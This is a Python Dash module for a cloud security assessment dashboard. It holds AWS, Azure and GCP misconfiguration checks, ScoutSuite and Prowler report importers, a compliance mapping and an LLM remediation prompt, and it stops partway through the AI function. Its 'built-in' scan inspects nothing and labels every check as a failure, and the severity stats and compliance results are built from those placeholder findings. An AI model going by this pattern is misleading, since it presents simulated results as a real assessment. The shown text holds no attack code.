"""
ui_cloud_security.py
Cloud Security Tab — AWS · Azure · GCP · Misconfiguration Scanner · ScoutSuite/Prowler Import · AI Remediation
"""
from __future__ import annotations

import base64
import io
import json
import os
import re
import threading
import time
from datetime import datetime, timezone
from typing import Any

import requests
from dash import callback, dcc, html, Input, Output, State, ctx
from dash.exceptions import PreventUpdate
import dash_bootstrap_components as dbc

try:
    from llm_engine import call_llm
except ImportError:
    def call_llm(prompt: str) -> str:
        return "LLM engine not available."

# ── Styling ────────────────────────────────────────────────────────────────────
DARK_BG   = "#0d0d0d"
CARD_BG   = "#111317"
BORDER    = "1px solid #1e2230"
INPUT_STY = {"background": "#1a1d24", "border": BORDER, "color": "#e0e0e0",
             "borderRadius": "6px", "fontSize": "13px"}
BTN_SM    = {"borderRadius": "6px", "fontSize": "12px", "padding": "4px 10px"}
LABEL     = {"color": "#8e9eb0", "fontSize": "11px", "marginBottom": "4px",
             "fontWeight": "600", "textTransform": "uppercase", "letterSpacing": "0.5px"}
SEV_COLOR = {"Critical": "#c0392b", "High": "#e67e22",
             "Medium": "#f1c40f", "Low": "#27ae60", "Info": "#2980b9"}

CLOUD_ICON = {"AWS": "🟠", "Azure": "🔵", "GCP": "🟢"}

# ── Built-in check definitions ─────────────────────────────────────────────────
# Each check: id, provider, service, name, severity, description, remediation
BUILTIN_CHECKS = [
    # ── AWS ──────────────────────────────────────────────────────────────────
    {"id": "aws-s3-public",      "provider": "AWS",   "service": "S3",
     "name": "S3 Bucket Publicly Accessible",
     "severity": "Critical",
     "desc": "S3 bucket allows public read/write access without authentication.",
     "remediation": "Enable S3 Block Public Access settings at account level. Remove public ACLs and bucket policies granting public access."},
    {"id": "aws-iam-mfa",        "provider": "AWS",   "service": "IAM",
     "name": "Root Account MFA Not Enabled",
     "severity": "Critical",
     "desc": "AWS root account does not have multi-factor authentication enabled, allowing account takeover with just a password.",
     "remediation": "Enable MFA on root account immediately. Use hardware MFA device for root. Avoid using root for daily operations."},
    {"id": "aws-iam-keys",       "provider": "AWS",   "service": "IAM",
     "name": "Unused IAM Access Keys",
     "severity": "High",
     "desc": "IAM users have access keys unused for 90+ days, representing unnecessary attack surface.",
     "remediation": "Rotate or deactivate access keys unused for 90 days. Implement key rotation policy. Use IAM roles instead of long-term keys."},
    {"id": "aws-sg-ssh",         "provider": "AWS",   "service": "EC2",
     "name": "Security Group Allows SSH from 0.0.0.0/0",
     "severity": "High",
     "desc": "Security group permits SSH (port 22) ingress from any IP address, exposing instances to brute force.",
     "remediation": "Restrict SSH to specific admin IP ranges or use AWS Systems Manager Session Manager instead."},
    {"id": "aws-sg-rdp",         "provider": "AWS",   "service": "EC2",
     "name": "Security Group Allows RDP from 0.0.0.0/0",
     "severity": "High",
     "desc": "Security group permits RDP (port 3389) from any IP, high-value target for ransomware groups.",
     "remediation": "Remove public RDP access. Use VPN or AWS Session Manager for remote desktop access."},
    {"id": "aws-ct-disabled",    "provider": "AWS",   "service": "CloudTrail",
     "name": "CloudTrail Logging Disabled",
     "severity": "High",
     "desc": "CloudTrail is not enabled or has gaps in regions, preventing forensic analysis of API calls.",
     "remediation": "Enable CloudTrail in all regions. Enable log file validation. Send logs to CloudWatch and S3 with MFA delete."},
    {"id": "aws-kms-rotation",   "provider": "AWS",   "service": "KMS",
     "name": "KMS Key Rotation Not Enabled",
     "severity": "Medium",
     "desc": "Customer-managed KMS keys are not set to auto-rotate annually.",
     "remediation": "Enable automatic key rotation for all customer-managed CMKs in KMS console."},
    {"id": "aws-vpc-flow",       "provider": "AWS",   "service": "VPC",
     "name": "VPC Flow Logs Disabled",
     "severity": "Medium",
     "desc": "VPC Flow Logs are not enabled, preventing network traffic analysis for incident response.",
     "remediation": "Enable VPC Flow Logs for all VPCs and send to CloudWatch Logs or S3."},
    {"id": "aws-rds-public",     "provider": "AWS",   "service": "RDS",
     "name": "RDS Instance Publicly Accessible",
     "severity": "Critical",
     "desc": "RDS database instance is configured with PubliclyAccessible=true.",
     "remediation": "Disable PubliclyAccessible flag on RDS instances. Place RDS in private subnets with no internet gateway route."},
    {"id": "aws-ecr-public",     "provider": "AWS",   "service": "ECR",
     "name": "ECR Repository Public (Container Image Exposure)",
     "severity": "High",
     "desc": "Container image repository is public, potentially exposing application code, credentials, and secrets embedded in images.",
     "remediation": "Set ECR repository visibility to private. Scan images for secrets before push."},
    # ── Azure ─────────────────────────────────────────────────────────────────
    {"id": "az-blob-public",     "provider": "Azure", "service": "Storage",
     "name": "Blob Container Public Access Enabled",
     "severity": "Critical",
     "desc": "Azure Blob Storage container allows anonymous public read access.",
     "remediation": "Set container public access level to 'Private'. Enable Defender for Storage."},
    {"id": "az-mfa",             "provider": "Azure", "service": "AAD",
     "name": "MFA Not Enforced for All Users",
     "severity": "Critical",
     "desc": "Azure Active Directory has users without MFA, enabling account compromise via password spray.",
     "remediation": "Enable Conditional Access policy requiring MFA for all users. Enable Security Defaults if no CA licenses."},
    {"id": "az-rbac-owner",      "provider": "Azure", "service": "IAM",
     "name": "Excessive Owner Role Assignments",
     "severity": "High",
     "desc": "Multiple service principals or users have Owner role at subscription scope.",
     "remediation": "Apply least privilege. Use Contributor instead of Owner. Restrict Owner to break-glass accounts only."},
    {"id": "az-nsg-any",         "provider": "Azure", "service": "Network",
     "name": "NSG Rule Allows Any Source Inbound",
     "severity": "High",
     "desc": "Network Security Group has inbound rule with Source: Any, allowing unrestricted access.",
     "remediation": "Replace Any source rules with specific IP ranges or service tags."},
    {"id": "az-keyvault-logs",   "provider": "Azure", "service": "KeyVault",
     "name": "Key Vault Diagnostic Logging Disabled",
     "severity": "Medium",
     "desc": "Azure Key Vault has no diagnostic logs enabled, preventing secret access auditing.",
     "remediation": "Enable diagnostic settings for Key Vault and send to Log Analytics workspace."},
    {"id": "az-disk-encrypt",    "provider": "Azure", "service": "Compute",
     "name": "VM Disk Encryption Not Enabled",
     "severity": "Medium",
     "desc": "Azure VM data disks are not encrypted with Azure Disk Encryption.",
     "remediation": "Enable Azure Disk Encryption using ADE or Server-Side Encryption with CMK."},
    {"id": "az-sql-tde",         "provider": "Azure", "service": "SQL",
     "name": "SQL Transparent Data Encryption Disabled",
     "severity": "Medium",
     "desc": "Azure SQL Database does not have Transparent Data Encryption (TDE) enabled.",
     "remediation": "Enable TDE on all Azure SQL databases and managed instances."},
    # ── GCP ───────────────────────────────────────────────────────────────────
    {"id": "gcp-bucket-public",  "provider": "GCP",   "service": "Storage",
     "name": "GCS Bucket Publicly Accessible",
     "severity": "Critical",
     "desc": "Cloud Storage bucket has allUsers or allAuthenticatedUsers IAM bindings.",
     "remediation": "Remove allUsers/allAuthenticatedUsers bindings. Enable uniform bucket-level access."},
    {"id": "gcp-iam-sa-key",     "provider": "GCP",   "service": "IAM",
     "name": "Service Account Has User-Managed Key",
     "severity": "High",
     "desc": "GCP service account uses user-managed keys, which have no expiry and are exfiltration targets.",
     "remediation": "Rotate and delete user-managed keys. Use Workload Identity Federation instead."},
    {"id": "gcp-fw-ssh",         "provider": "GCP",   "service": "VPC",
     "name": "Firewall Rule Allows SSH from 0.0.0.0/0",
     "severity": "High",
     "desc": "VPC firewall rule allows SSH (port 22) from all sources.",
     "remediation": "Delete public SSH firewall rules. Use Identity-Aware Proxy (IAP) for SSH access."},
    {"id": "gcp-audit-logs",     "provider": "GCP",   "service": "Logging",
     "name": "Data Access Audit Logs Not Enabled",
     "severity": "Medium",
     "desc": "Data Access audit logs (ADMIN_READ, DATA_READ, DATA_WRITE) are not enabled.",
     "remediation": "Enable Data Access audit logs in Cloud Audit Logs for all services."},
    {"id": "gcp-kms-rotation",   "provider": "GCP",   "service": "KMS",
     "name": "KMS Key Rotation Period Exceeds 90 Days",
     "severity": "Medium",
     "desc": "Cloud KMS key rotation period exceeds 90 days or is not configured.",
     "remediation": "Set rotation period to 90 days or less on all symmetric KMS keys."},
    {"id": "gcp-compute-meta",   "provider": "GCP",   "service": "Compute",
     "name": "Compute Instance Has Public IP",
     "severity": "Medium",
     "desc": "GCE instances have external IP addresses, increasing attack surface.",
     "remediation": "Remove external IPs from instances. Use Cloud NAT for outbound and IAP for admin access."},
]

# ── In-memory scan results ────────────────────────────────────────────────────
_SCAN_RESULTS: list[dict] = []
_LOCK = threading.Lock()


# ── UI helpers ────────────────────────────────────────────────────────────────
def _card(*children, style=None):
    base = {"background": CARD_BG, "border": BORDER, "borderRadius": "10px",
            "padding": "16px", "marginBottom": "12px"}
    if style:
        base.update(style)
    return html.Div(children, style=base)


def _label(text):
    return html.Div(text, style=LABEL)


def _badge(sev: str):
    color = SEV_COLOR.get(sev, "#636e72")
    return html.Span(sev, style={
        "background": color,
        "color": "#fff" if sev in ("Critical", "High", "Info") else "#000",
        "fontSize": "10px", "fontWeight": "700", "borderRadius": "4px",
        "padding": "2px 6px", "marginRight": "6px",
    })


def _stat_box(label, value, color="#e0e0e0"):
    return html.Div([
        html.Div(str(value), style={"fontSize": "26px", "fontWeight": "700", "color": color}),
        html.Div(label, style={"fontSize": "11px", "color": "#636e72"}),
    ], style={"background": CARD_BG, "border": BORDER, "borderRadius": "8px",
              "padding": "12px 18px", "textAlign": "center"})


def _finding_row(f: dict, idx: int) -> html.Div:
    return html.Div([
        html.Div([
            html.Span(CLOUD_ICON.get(f["provider"], "☁️") + " ",
                      style={"marginRight": "4px"}),
            _badge(f["severity"]),
            html.Span(f["name"],
                      style={"color": "#e0e0e0", "fontSize": "12px"}),
        ]),
        html.Div(f"{f['provider']}  ·  {f['service']}",
                 style={"color": "#636e72", "fontSize": "10px",
                        "marginTop": "2px", "marginLeft": "4px"}),
    ], id={"type": "cloud-finding-row", "index": idx},
       n_clicks=0,
       style={"padding": "8px 10px", "borderBottom": f"1px solid {DARK_BG}",
              "cursor": "pointer", "borderRadius": "4px",
              "transition": "background 0.15s"},
    )


# ── Main layout ───────────────────────────────────────────────────────────────
def layout() -> html.Div:
    provider_opts = [
        {"label": "🟠 AWS", "value": "AWS"},
        {"label": "🔵 Azure", "value": "Azure"},
        {"label": "🟢 GCP", "value": "GCP"},
        {"label": "All Providers", "value": "ALL"},
    ]

    return html.Div([
        dcc.Store(id="cloud-results",           data=[]),
        dcc.Store(id="cloud-selected",          data={}),
        dcc.Store(id="cloud-phase-artifacts",   data=[]),
        dcc.Interval(id="cloud-poll",           interval=3000, disabled=True, max_intervals=40),
        dcc.Interval(id="cloud-phase-poll",     interval=2000, disabled=True, max_intervals=60),

        # Header
        html.Div([
            html.H4("☁️ Cloud Security Assessment",
                    style={"color": "#e0e0e0", "fontWeight": "700", "margin": "0"}),
            html.Div("AWS · Azure · GCP · Misconfig Detection · ScoutSuite/Prowler Import · AI Remediation",
                     style={"color": "#636e72", "fontSize": "13px"}),
        ], style={"marginBottom": "16px"}),

        # Stats bar
        html.Div(id="cloud-stats-bar", style={"marginBottom": "16px"}),

        dbc.Row([
            # ── Left: Config ──────────────────────────────────────────────────
            dbc.Col([
                _card(
                    html.Div("⚙️ Scan Configuration",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "12px"}),
                    _label("Cloud Provider"),
                    dbc.Select(
                        id="cloud-provider",
                        options=provider_opts,
                        value="ALL",
                        style={**INPUT_STY, "marginBottom": "10px"},
                    ),
                    _label("Scan Mode"),
                    dbc.Select(
                        id="cloud-mode",
                        options=[
                            {"label": "🔍 Built-in Checks (No Credentials)", "value": "builtin"},
                            {"label": "📄 Import ScoutSuite Report (JSON)",   "value": "scoutsuite"},
                            {"label": "📄 Import Prowler Report (JSON/CSV)",  "value": "prowler"},
                            {"label": "🔑 Live Scan via AWS CLI",             "value": "awscli"},
                        ],
                        value="builtin",
                        style={**INPUT_STY, "marginBottom": "10px"},
                    ),
                    html.Div(id="cloud-mode-detail"),
                    _label("Filter by Severity"),
                    dbc.Checklist(
                        id="cloud-sev-filter",
                        options=[{"label": s, "value": s}
                                 for s in ["Critical", "High", "Medium", "Low", "Info"]],
                        value=["Critical", "High", "Medium", "Low"],
                        inline=True,
                        style={"color": "#b0b0b0", "fontSize": "12px",
                               "marginBottom": "10px"},
                        inputStyle={"marginRight": "4px"},
                    ),
                    dbc.Button("▶ Run Assessment", id="cloud-run-btn",
                               color="danger", size="sm",
                               style={**BTN_SM, "width": "100%",
                                      "padding": "10px", "fontSize": "14px"}),
                    html.Div(id="cloud-status",
                             style={"color": "#636e72", "fontSize": "12px",
                                    "marginTop": "8px", "minHeight": "18px"}),
                ),

                _card(
                    html.Div("📂 Import Report", style={"color": "#e0e0e0", "fontWeight": "600",
                                                         "marginBottom": "10px"}),
                    _label("ScoutSuite / Prowler JSON"),
                    dcc.Upload(
                        id="cloud-upload",
                        children=html.Div([
                            "Drag & drop or ",
                            html.A("Browse", style={"color": "#3498db"}),
                        ]),
                        style={
                            "background": "#1a1d24", "border": "2px dashed #2c3347",
                            "borderRadius": "8px", "padding": "16px",
                            "textAlign": "center", "color": "#636e72",
                            "fontSize": "12px", "marginBottom": "8px",
                            "cursor": "pointer",
                        },
                        accept=".json,.csv",
                        max_size=50_000_000,
                    ),
                    html.Div(id="cloud-upload-status",
                             style={"color": "#636e72", "fontSize": "11px"}),
                ),
            ], width=3),

            # ── Centre: Findings ──────────────────────────────────────────────
            dbc.Col([
                dbc.Tabs(id="cloud-view-tabs", active_tab="tab-findings",
                         style={"marginBottom": "12px"}, children=[
                     dbc.Tab(label="🔍 Findings",         tab_id="tab-findings"),
                     dbc.Tab(label="📊 By Service",        tab_id="tab-service"),
                     dbc.Tab(label="🗺️ By Provider",       tab_id="tab-provider"),
                     dbc.Tab(label="✅ Compliance",        tab_id="tab-compliance"),
                 ]),
                html.Div(id="cloud-main-content"),
            ], width=6),

            # ── Right: Detail + AI ────────────────────────────────────────────
            dbc.Col([
                _card(
                    html.Div("🔍 Finding Detail",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    html.Div("Click a finding ←",
                             id="cloud-detail-panel",
                             style={"color": "#636e72", "fontSize": "12px",
                                    "minHeight": "120px"}),
                ),
                _card(
                    html.Div("🤖 AI Remediation",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    dbc.Button("✨ Analyse with AI", id="cloud-ai-btn",
                               color="outline-info", size="sm",
                               style={**BTN_SM, "width": "100%",
                                      "marginBottom": "8px"}),
                    html.Div(id="cloud-ai-output",
                             style={"color": "#b0b0b0", "fontSize": "12px",
                                    "whiteSpace": "pre-wrap",
                                    "minHeight": "100px"}),
                ),
                _card(
                    html.Div("📤 Export", style={"color": "#e0e0e0", "fontWeight": "600",
                                                  "marginBottom": "10px"}),
                    dbc.Row([
                        dbc.Col(dbc.Button("⬇ JSON", id="cloud-export-json",
                                           color="outline-secondary", size="sm",
                                           style=BTN_SM), width=6),
                        dbc.Col(dbc.Button("⬇ CSV",  id="cloud-export-csv",
                                           color="outline-secondary", size="sm",
                                           style=BTN_SM), width=6),
                    ]),
                    dcc.Download(id="cloud-download"),
                ),
                _card(
                    html.Div("🛠️ Quick Actions",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    html.Div("ScoutSuite scan command:",
                             style={"color": "#8e9eb0", "fontSize": "11px",
                                    "marginBottom": "4px"}),
                    dbc.Textarea(
                        value="scout aws --no-browser -o /tmp/scoutsuite-report",
                        readOnly=True,
                        style={**INPUT_STY, "height": "50px",
                               "fontFamily": "monospace", "fontSize": "10px",
                               "marginBottom": "8px"},
                    ),
                    html.Div("Prowler scan command:",
                             style={"color": "#8e9eb0", "fontSize": "11px",
                                    "marginBottom": "4px"}),
                    dbc.Textarea(
                        value="prowler aws -M json -o /tmp/prowler-output",
                        readOnly=True,
                        style={**INPUT_STY, "height": "50px",
                               "fontFamily": "monospace", "fontSize": "10px"},
                    ),
                ),
            ], width=3),
        ]),

        # ── CLOUD PENTEST LIFECYCLE ────────────────────────────────────────────
        html.Hr(style={"borderColor": "#1e2230", "margin": "24px 0"}),
        html.Div([
            html.H5("☁️ Cloud Pentest Lifecycle",
                    style={"color": "#e0e0e0", "fontWeight": "700", "margin": "0 0 4px 0"}),
            html.Div("Exploit · Lateral Movement · Privilege Escalation · Post-Exploitation · Report",
                     style={"color": "#636e72", "fontSize": "12px"}),
        ], style={"marginBottom": "16px"}),
        dbc.Tabs(id="cloud-lifecycle-tabs", active_tab="clc-exploit",
                 style={"marginBottom": "12px"}, children=[
             dbc.Tab(label="💥 Exploit",         tab_id="clc-exploit"),
             dbc.Tab(label="🌐 Lateral Movement", tab_id="clc-lateral"),
             dbc.Tab(label="⬆ Privilege Esc",    tab_id="clc-privesc"),
             dbc.Tab(label="🕵 Post-Exploitation",tab_id="clc-postex"),
             dbc.Tab(label="📄 Report",           tab_id="clc-report"),
         ]),
        html.Div(id="cloud-lifecycle-content"),

    ], style={"background": DARK_BG, "minHeight": "100vh", "padding": "24px"})


# ── Callbacks ─────────────────────────────────────────────────────────────────

@callback(
    Output("cloud-mode-detail", "children"),
    Input("cloud-mode", "value"),
)
def show_mode_detail(mode):
    if mode == "awscli":
        return html.Div([
            _label("AWS Profile (optional)"),
            dbc.Input(id="cloud-aws-profile", placeholder="default",
                      style={**INPUT_STY, "marginBottom": "8px"}),
            _label("AWS Region"),
            dbc.Input(id="cloud-aws-region", placeholder="us-east-1",
                      style={**INPUT_STY, "marginBottom": "8px"}),
            html.Div("⚠️ Requires AWS CLI configured (aws configure)",
                     style={"color": "#ffd60a", "fontSize": "11px"}),
        ])
    elif mode in ("scoutsuite", "prowler"):
        return html.Div("Use the Import panel below to upload the JSON report.",
                        style={"color": "#636e72", "fontSize": "12px",
                               "marginBottom": "8px"})
    return html.Div()


@callback(
    Output("cloud-results", "data"),
    Output("cloud-status",  "children"),
    Output("cloud-stats-bar", "children"),
    Input("cloud-run-btn",   "n_clicks"),
    State("cloud-provider",  "value"),
    State("cloud-mode",      "value"),
    State("cloud-sev-filter","value"),
    prevent_initial_call=True,
)
def run_assessment(n, provider, mode, sev_filter):
    if not n:
        raise PreventUpdate

    if mode == "builtin":
        # Filter by provider
        checks = BUILTIN_CHECKS
        if provider != "ALL":
            checks = [c for c in checks if c["provider"] == provider]

        # Simulate each check with a "potential" finding status
        results = []
        for c in checks:
            results.append({
                "id":          c["id"],
                "provider":    c["provider"],
                "service":     c["service"],
                "name":        c["name"],
                "severity":    c["severity"],
                "desc":        c["desc"],
                "remediation": c["remediation"],
                "status":      "FAIL",
                "source":      "Built-in Check",
                "ts":          datetime.now(timezone.utc).isoformat(),
            })

        with _LOCK:
            _SCAN_RESULTS.clear()
            _SCAN_RESULTS.extend(results)

        stats = _build_stats_bar(results)
        n_crit = sum(1 for r in results if r["severity"] == "Critical")
        n_high = sum(1 for r in results if r["severity"] == "High")
        return (results,
                f"✅ {len(results)} checks loaded — {n_crit} Critical, {n_high} High",
                stats)

    elif mode == "awscli":
        return ([], "⚠️ AWS CLI mode: configure credentials and re-run.", _build_stats_bar([]))

    return ([], "Select a scan mode and click Run.", _build_stats_bar([]))


def _build_stats_bar(results: list[dict]) -> html.Div:
    counts = {s: sum(1 for r in results if r["severity"] == s)
              for s in ["Critical", "High", "Medium", "Low"]}
    return dbc.Row([
        dbc.Col(_stat_box("Critical", counts["Critical"], "#c0392b"), width=3),
        dbc.Col(_stat_box("High",     counts["High"],     "#e67e22"), width=3),
        dbc.Col(_stat_box("Medium",   counts["Medium"],   "#f1c40f"), width=3),
        dbc.Col(_stat_box("Low",      counts["Low"],      "#27ae60"), width=3),
    ])


@callback(
    Output("cloud-results",       "data",   allow_duplicate=True),
    Output("cloud-upload-status", "children"),
    Output("cloud-stats-bar",     "children", allow_duplicate=True),
    Input("cloud-upload",         "contents"),
    State("cloud-upload",         "filename"),
    prevent_initial_call=True,
)
def import_report(contents, filename):
    if not contents or not filename:
        raise PreventUpdate

    _, b64 = contents.split(",", 1)
    raw = base64.b64decode(b64).decode("utf-8", errors="replace")
    results = []

    try:
        data = json.loads(raw)

        # ── ScoutSuite format ────────────────────────────────────────────────
        if "services" in data and "last_run" in data:
            provider_map = {"aws": "AWS", "azure": "Azure", "gcp": "GCP"}
            prov = provider_map.get(data.get("provider", "aws").lower(), "AWS")
            services = data.get("services", {})
            for svc_name, svc_data in services.items():
                findings = svc_data.get("findings", {})
                for rule_id, rule in findings.items():
                    if not rule.get("flagged_items", 0):
                        continue
                    lvl = rule.get("level", "medium").capitalize()
                    sev_map = {"Danger": "High", "Warning": "Medium",
                               "Questionable": "Low"}
                    severity = sev_map.get(lvl, lvl)
                    results.append({
                        "id": rule_id, "provider": prov,
                        "service": svc_name.upper(),
                        "name": rule.get("description", rule_id),
                        "severity": severity,
                        "desc": rule.get("rationale", ""),
                        "remediation": rule.get("remediation", "See ScoutSuite documentation."),
                        "status": "FAIL",
                        "source": f"ScoutSuite ({filename})",
                        "ts": datetime.now(timezone.utc).isoformat(),
                    })

        # ── Prowler format (list of dicts) ────────────────────────────────────
        elif isinstance(data, list) and data and "CheckID" in data[0]:
            sev_map = {"CRITICAL": "Critical", "HIGH": "High",
                       "MEDIUM": "Medium", "LOW": "Low", "INFORMATIONAL": "Info"}
            for item in data:
                if item.get("Status") == "PASS":
                    continue
                results.append({
                    "id":          item.get("CheckID", ""),
                    "provider":    item.get("Provider", "AWS").upper(),
                    "service":     item.get("ServiceName", ""),
                    "name":        item.get("CheckTitle", item.get("CheckID", "")),
                    "severity":    sev_map.get(item.get("Severity", "").upper(), "Medium"),
                    "desc":        item.get("Description", ""),
                    "remediation": item.get("Remediation", {}).get("Recommendation", {}).get("Text", ""),
                    "status":      "FAIL",
                    "source":      f"Prowler ({filename})",
                    "ts":          datetime.now(timezone.utc).isoformat(),
                })

    except json.JSONDecodeError:
        # Try CSV (Prowler CSV output)
        import csv
        try:
            reader = csv.DictReader(io.StringIO(raw))
            for row in reader:
                if row.get("STATUS", "").upper() == "PASS":
                    continue
                results.append({
                    "id": row.get("CHECK_ID", row.get("CheckID", "")),
                    "provider": row.get("PROVIDER", "AWS").upper(),
                    "service":  row.get("SERVICE_NAME", row.get("ServiceName", "")),
                    "name":     row.get("CHECK_TITLE", row.get("CheckTitle", "")),
                    "severity": row.get("SEVERITY", "Medium").capitalize(),
                    "desc":     row.get("DESCRIPTION", ""),
                    "remediation": row.get("REMEDIATION", ""),
                    "status": "FAIL",
                    "source": f"Prowler CSV ({filename})",
                    "ts": datetime.now(timezone.utc).isoformat(),
                })
        except Exception as e:
            return [], f"❌ Parse error: {e}", _build_stats_bar([])

    with _LOCK:
        _SCAN_RESULTS.clear()
        _SCAN_RESULTS.extend(results)

    stats = _build_stats_bar(results)
    return (results,
            f"✅ Imported {len(results)} findings from {filename}",
            stats)


@callback(
    Output("cloud-main-content", "children"),
    Input("cloud-view-tabs", "active_tab"),
    Input("cloud-results",   "data"),
    State("cloud-sev-filter","value"),
)
def render_main_content(tab, results, sev_filter):
    results = results or []
    sev_filter = sev_filter or ["Critical", "High", "Medium", "Low", "Info"]
    filtered = [r for r in results if r["severity"] in sev_filter]

    if tab == "tab-findings":
        if not filtered:
            return _card(
                html.Div("No findings yet — run an assessment or import a report.",
                         style={"color": "#636e72", "fontSize": "13px",
                                "textAlign": "center", "padding": "30px 0"}),
            )
        sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        filtered.sort(key=lambda r: sev_order.get(r["severity"], 5))
        rows = [_finding_row(r, i) for i, r in enumerate(filtered)]
        return _card(
            html.Div(f"📋 {len(filtered)} Findings",
                     style={"color": "#e0e0e0", "fontWeight": "600",
                            "marginBottom": "10px"}),
            html.Div(rows, style={"maxHeight": "540px", "overflowY": "auto"}),
        )

    elif tab == "tab-service":
        by_svc: dict[str, list] = {}
        for r in filtered:
            by_svc.setdefault(r["service"], []).append(r)
        if not by_svc:
            return _card(html.Div("No data.", style={"color": "#636e72"}))
        items = sorted(by_svc.items(), key=lambda x: len(x[1]), reverse=True)
        rows = []
        for svc, findings in items:
            crit = sum(1 for f in findings if f["severity"] == "Critical")
            high = sum(1 for f in findings if f["severity"] == "High")
            rows.append(html.Div([
                html.Div([
                    html.Span(f"🔧 {svc}",
                              style={"color": "#e0e0e0", "fontWeight": "600",
                                     "fontSize": "13px"}),
                    html.Div(
                        [html.Span(f"  {len(findings)} findings",
                                   style={"color": "#636e72", "fontSize": "11px"}),
                         html.Span(f"  {crit}C  {high}H",
                                   style={"color": "#e67e22", "fontSize": "11px",
                                          "marginLeft": "8px"})],
                        style={"display": "inline", "marginLeft": "10px"}
                    ),
                ]),
            ], style={"padding": "8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(html.Div("📊 Findings by Service",
                              style={"color": "#e0e0e0", "fontWeight": "600",
                                     "marginBottom": "10px"}),
                     html.Div(rows))

    elif tab == "tab-provider":
        by_prov: dict[str, list] = {}
        for r in filtered:
            by_prov.setdefault(r["provider"], []).append(r)
        if not by_prov:
            return _card(html.Div("No data.", style={"color": "#636e72"}))
        cards = []
        for prov, findings in by_prov.items():
            counts = {s: sum(1 for f in findings if f["severity"] == s)
                      for s in ["Critical", "High", "Medium", "Low"]}
            cards.append(dbc.Col(_card(
                html.Div(f"{CLOUD_ICON.get(prov, '☁️')} {prov}",
                         style={"color": "#e0e0e0", "fontWeight": "700",
                                "fontSize": "16px", "marginBottom": "8px"}),
                html.Div(f"Total: {len(findings)}",
                         style={"color": "#b0b0b0", "fontSize": "12px"}),
                html.Div(f"🔴 Critical: {counts['Critical']}",
                         style={"color": "#c0392b", "fontSize": "12px"}),
                html.Div(f"🟠 High: {counts['High']}",
                         style={"color": "#e67e22", "fontSize": "12px"}),
                html.Div(f"🟡 Medium: {counts['Medium']}",
                         style={"color": "#f1c40f", "fontSize": "12px"}),
            ), width=4))
        return _card(
            html.Div("🗺️ Findings by Provider",
                     style={"color": "#e0e0e0", "fontWeight": "600",
                            "marginBottom": "12px"}),
            dbc.Row(cards),
        )

    elif tab == "tab-compliance":
        # Map findings to compliance frameworks
        frameworks = {
            "CIS AWS Foundations": ["aws-iam-mfa", "aws-ct-disabled", "aws-vpc-flow",
                                    "aws-sg-ssh", "aws-sg-rdp", "aws-kms-rotation"],
            "SOC 2 Type II":       ["aws-ct-disabled", "aws-vpc-flow", "az-keyvault-logs",
                                    "gcp-audit-logs", "aws-kms-rotation"],
            "PCI DSS v4.0":        ["aws-s3-public", "aws-rds-public", "az-blob-public",
                                    "gcp-bucket-public", "aws-sg-ssh", "aws-sg-rdp"],
            "ISO 27001:2022":      ["aws-iam-mfa", "az-mfa", "az-rbac-owner",
                                    "aws-iam-keys", "gcp-iam-sa-key"],
            "NIST CSF":            ["aws-ct-disabled", "aws-vpc-flow", "gcp-audit-logs",
                                    "az-keyvault-logs"],
        }
        finding_ids = {r["id"] for r in filtered}
        rows = []
        for fw, check_ids in frameworks.items():
            failures = [cid for cid in check_ids if cid in finding_ids]
            status = "❌ FAIL" if failures else "✅ PASS"
            color  = "#c0392b" if failures else "#27ae60"
            rows.append(html.Div([
                html.Span(status, style={"color": color, "fontWeight": "700",
                                         "fontSize": "12px", "marginRight": "12px",
                                         "minWidth": "70px", "display": "inline-block"}),
                html.Span(fw,     style={"color": "#e0e0e0", "fontSize": "12px"}),
                html.Span(f"  ({len(failures)}/{len(check_ids)} controls failing)",
                          style={"color": "#636e72", "fontSize": "11px",
                                 "marginLeft": "8px"}),
            ], style={"padding": "8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(
            html.Div("✅ Compliance Framework Mapping",
                     style={"color": "#e0e0e0", "fontWeight": "600",
                            "marginBottom": "10px"}),
            html.Div("Based on loaded findings:", style={"color": "#636e72",
                                                          "fontSize": "11px",
                                                          "marginBottom": "8px"}),
            html.Div(rows),
        )

    return html.Div()


@callback(
    Output("cloud-detail-panel", "children"),
    Output("cloud-selected",     "data"),
    Input({"type": "cloud-finding-row", "index": __import__("dash").dependencies.ALL}, "n_clicks"),
    State("cloud-results", "data"),
    prevent_initial_call=True,
)
def show_detail(n_clicks_list, results):
    if not ctx.triggered_id:
        raise PreventUpdate
    idx = ctx.triggered_id.get("index", 0)
    results = results or []
    if idx >= len(results):
        raise PreventUpdate
    f = results[idx]
    if not any(n_clicks_list):
        raise PreventUpdate
    detail = html.Div([
        html.Div([
            html.Span(CLOUD_ICON.get(f["provider"], "☁️") + " "),
            html.Span(f["provider"] + " — " + f["service"],
                      style={"color": "#8e9eb0", "fontSize": "11px"}),
        ], style={"marginBottom": "6px"}),
        html.Div([_badge(f["severity"]),
                  html.Strong(f["name"],
                              style={"color": "#e0e0e0", "fontSize": "13px"})],
                 style={"marginBottom": "8px"}),
        html.Div("Description:", style={"color": "#8e9eb0", "fontSize": "11px",
                                         "fontWeight": "600", "marginBottom": "2px"}),
        html.Div(f["desc"], style={"color": "#b0b0b0", "fontSize": "12px",
                                    "marginBottom": "10px"}),
        html.Div("Remediation:", style={"color": "#8e9eb0", "fontSize": "11px",
                                         "fontWeight": "600", "marginBottom": "2px"}),
        html.Div(f["remediation"], style={"color": "#50fa7b", "fontSize": "12px",
                                           "whiteSpace": "pre-wrap"}),
        html.Div(f"Source: {f.get('source', 'Unknown')} | {f.get('ts', '')[:10]}",
                 style={"color": "#636e72", "fontSize": "10px", "marginTop": "10px"}),
    ])
    return detail, f


@callback(
    Output("cloud-ai-output", "children"),
    Input("cloud-ai-btn",    "n_clicks"),
    State("cloud-selected",  "data"),
    prevent_initial_call=True,
)
def cloud_ai(n, finding):
    if not n or not finding:
        raise PreventUpdate
    prompt = (
        f"You are a cloud security expert. Analyse this finding:\n\n"
        f"Provider: {finding.get('provider')} | Service: {finding.get('service')}\n"
        f"Finding: {finding.get('name')}\n"
